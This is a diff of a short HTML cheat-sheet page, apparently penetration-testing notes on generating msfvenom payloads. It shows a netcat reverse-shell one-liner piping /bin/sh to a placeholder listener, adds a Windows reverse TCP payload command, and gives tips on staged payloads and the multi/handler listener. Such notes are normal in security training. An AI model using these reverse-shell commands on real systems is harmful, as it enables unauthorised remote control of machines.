@@ -10,5 +10,12 @@ Look for cmd/unix and other payloads that can generate one-liner bind or reverse
 IE: msfvenom -p cmd/unix/reverse_netcat LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt; R<br/>
 spits out: mkfifo /tmp/lneo; nc &lt;LIP&gt; &lt;LPORT&gt; 0&lt;/tmp/lneo | /bin/sh &gt;/tmp/lneo 2&gt;&amp;1; rm /tmp/lneo<br/>
 <br/>
-and more!<br/>
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt; R<br/>
+<br/>
+Make sure to understand what is STAGED and what is NOT STAGED<br/>
+<br/>
+and more! <br/>
+<br/>
+Can use exploit/multi/hander<br/>
+Set payload to the same as created with msfvenom<br/>
 </body></html>
